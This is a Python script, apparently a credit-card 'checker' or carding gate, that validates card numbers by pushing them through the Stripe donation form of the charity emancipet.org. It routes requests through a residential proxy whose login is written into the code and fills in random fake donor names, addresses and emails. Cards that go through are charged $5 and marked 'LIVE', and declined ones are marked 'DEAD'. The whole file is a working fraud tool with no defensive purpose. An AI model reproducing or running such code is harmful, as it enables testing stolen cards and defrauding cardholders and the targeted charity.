
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json 
import names
import platform
import html
import ssl
import certifi
import names
import random_address
import time

async def GateMasstr(session, cc):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    timeout=20
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        
        genaddr = random_address.real_random_address()
        address = genaddr['address1']
        try:  City = genaddr['city']
        except KeyError: City = "FL"
        State = genaddr['state']
        Zip_Code = genaddr['postalCode']
        first = names.get_first_name()
        last = names.get_last_name()

        if platform.system()=='Windows': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

        CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"
        try:
            inicio = time.time()
            try:
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    #'Referer': 'https://uwoaa.org/',
                    'Connection': 'keep-alive',
                })
                async with session.get('https://emancipet.org/give/emancipet-donation?giveDonationFormInIframe=1', proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), timeout=timeout) as resp:        
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    formid = soup.find("input", {"name": "give-form-id"})["value"]
                    #registerhash = soup.find("input", {"name": "give-form-user-register-hash"})["data-time"]
            except UnboundLocalError :
                return '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'
            except KeyError:
                return '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return '[ ERROR ⚠ ]','An unexpected error occurred in request 01.♻️', f'{time.time()-inicio}'  

            try:
                data = {
                    'action': 'give_donation_form_reset_all_nonce',
                    'give_form_id': formid,
                }
                async with session.post('https://emancipet.org/wp-admin/admin-ajax.php', data=data,proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), timeout=timeout) as resp:
                    response = await resp.json()  
                    give_form_hash = response['data']['give_form_hash']
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 02.♻️', f'{time.time()-inicio}'   
            try:
                data = f'type=card&billing_details[name]={first}+{last}&billing_details[email]={CorreoRand}&billing_details[address][line1]={address}&billing_details[address][line2]=&billing_details[address][city]={City}&billing_details[address][state]={State}&billing_details[address][postal_code]={Zip_Code}&billing_details[address][country]=US&card[number]={ccnum}&card[cvc]=&card[exp_month]={mes}&card[exp_year]={ano}&guid=54916f7b-2007-4b82-b680-6500faa3ffd528c1bd&muid=f3b38a03-e435-4017-ad7e-69582bd79a14d2bc94&sid=204ed80e-9814-4321-ab14-37a72c5c1ad721d763&pasted_fields=number&payment_user_agent=stripe.js%2Fe53c6dc2eb%3B+stripe-js-v3%2Fe53c6dc2eb&time_on_page=29200&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1GxdnhH0GQ2NVjAN'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                    'Accept': 'application/json',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Referer': 'https://js.stripe.com/',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://js.stripe.com',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                }
                async with session.post('https://api.stripe.com/v1/payment_methods', proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"),headers=headers,data=data, timeout=timeout) as resp:
                    response = await resp.json()
                    responsetexto = await resp.text()
                    if int(responsetexto.find('"decline_code"')) > 0 :
                        ree = response['error']['decline_code']
                        ree = str(ree).replace('_'," ").title()
        
                        return '[ DEAD ❌ ]', ree, f'{time.time()-inicio}'  
                    elif int(responsetexto.find('"code"')) >= 0 :
                        ree = response['error']['code']
                        ree = str(ree).replace('_'," ").title()
        
                        return '[ DEAD ❌ ]', ree, f'{time.time()-inicio}'  
                    idstripe = response['id']
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 03.♻️', f'{time.time()-inicio}'  
            
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://emancipet.org',
                    'Alt-Used': 'emancipet.org',
                    'Connection': 'keep-alive',
                    'Referer': 'https://emancipet.org/give/emancipet-donation?giveDonationFormInIframe=1',
                }
                data = {
                    'give-fee-amount': '0.42',
                    'give-fee-mode-enable': 'false',
                    'give-fee-status': 'enabled',
                    'give-honeypot': '',
                    'give-form-id-prefix': f'{formid}-1',
                    'give-form-id': formid,
                    'give-form-title': 'Emancipet Donation',
                    'give-current-url': 'https://emancipet.org/donate-today/',
                    'give-form-url': 'https://emancipet.org/give/emancipet-donation/',
                    'give-form-minimum': '5',
                    'give-form-maximum': '1000000',
                    'give-form-hash': give_form_hash,
                    'give-price-id': 'custom',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': '1',
                    '_give_is_donation_recurring': '0',
                    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                    'give-amount': '5',
                    'give_tributes_type': 'In honor of',
                    'give_tributes_show_dedication': 'no',
                    'give-tributes-type': 'In honor of',
                    'give_tributes_first_name': '',
                    'give_tributes_last_name': '',
                    'give_tributes_would_to': 'none',
                    'give_tributes_ecard_notify[recipient][personalized][]': '',
                    'give_tributes_ecard_notify[recipient][first_name][]': '',
                    'give_tributes_ecard_notify[recipient][last_name][]': '',
                    'give_tributes_ecard_notify[recipient][email][]': '',
                    'give-tributes-mail-card-personalized-message': '',
                    'give_tributes_mail_card_notify_first_name': '',
                    'give_tributes_mail_card_notify_last_name': '',
                    'give_tributes_address_country': 'US',
                    'give_tributes_mail_card_address_1': '',
                    'give_tributes_mail_card_address_2': '',
                    'give_tributes_mail_card_city': '',
                    'give_tributes_address_state': State,
                    'give_tributes_mail_card_zipcode': '',
                    'give_stripe_payment_method': idstripe,
                    'give-fee-recovery-settings': '{"fee_data":{"all_gateways":{"percentage":"2.200000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
                    'give_first': first,
                    'give_last': last,
                    'give_company_option': 'no',
                    'give_company_name': '',
                    'give_email': CorreoRand,
                    'salesforce_campaign_id': '7014x0000011amNAAQ',
                    'payment-mode': 'stripe',
                    'billing_country': 'US',
                    'card_address': address,
                    'card_address_2': '',
                    'card_city': City,
                    'card_state': State,
                    'card_zip': Zip_Code,
                    'p2pSourceID': '',
                    'p2pSourceType': '',
                    'give_action': 'purchase',
                    'give-gateway': 'stripe',
                    'give_embed_form': '1',
                }
                async with session.post(f'https://emancipet.org/give/emancipet-donation/?payment-mode=stripe&form-id={formid}', data=data, headers=headers, proxy=str("http://QefZIpxf:6XRnahMifg_country-us@residential.proxies.gg:40000"), timeout=timeout) as resp:          
                    response = await resp.text()
            except UnboundLocalError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 04.♻️', f'{time.time()-inicio}'  
            except TypeError :
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 04.♻️', f'{time.time()-inicio}'
            except KeyError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 04.♻️', f'{time.time()-inicio}'   
            except IndexError:
                return  '[ ERROR ⚠ ]','An unexpected error occurred in request 04.♻️', f'{time.time()-inicio}' 
            #---------------------------------REQUEST CHECKS---------------   ---------------#
            #---------------------------------REQUEST CHECKS---------------   ---------------#

            if int(response.find('Donation Receipt')) > 0 :
                return '[ LIVE ✅ ]', "Charged: 5$", f'{time.time()-inicio}'
            elif int(response.find('3d_secure')) > 0 :
                return '[ ERROR ❌ ]', "3D Required", f'{time.time()-inicio}'
            elif int(response.find('Error creating payment intent with Stripe. Please try again.')) > 0 :
                return '[ DEAD ❌ ]', "Payment Declined", f'{time.time()-inicio}'
            else :
                return '[ ERROR ⚠ ]', "An unexpected error occurred in response. It was not generated correctly. ⚠️", f'{time.time()-inicio}'
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return '[ ERROR ⚠ ]','An unexpected error occurred. ServerDisconnectedError. ♻️', f'{time.time()-inicio}'
        except (asyncio.exceptions.TimeoutError):
            return '[ ERROR ⚠ ]','An unexpected error occurred. Timeout Error. ♻️', f'{time.time()-inicio}'
        except (aiohttp.client_exceptions.ClientConnectorError):
            return '[ ERROR ⚠ ]','An unexpected error occurred. ClientConnectorError. ♻️', f'{time.time()-inicio}'
        finally:
            await session.close()